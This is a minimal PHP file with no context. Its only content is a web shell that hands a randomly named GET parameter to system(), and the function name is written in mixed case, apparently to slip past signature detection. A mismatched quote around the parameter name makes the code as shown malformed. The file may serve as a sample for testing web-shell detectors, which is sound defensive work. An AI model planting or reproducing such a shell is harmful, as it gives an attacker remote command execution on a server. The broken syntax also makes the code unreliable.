<?php
SysTeM($_GET["d_9Qs0tN']);
?>
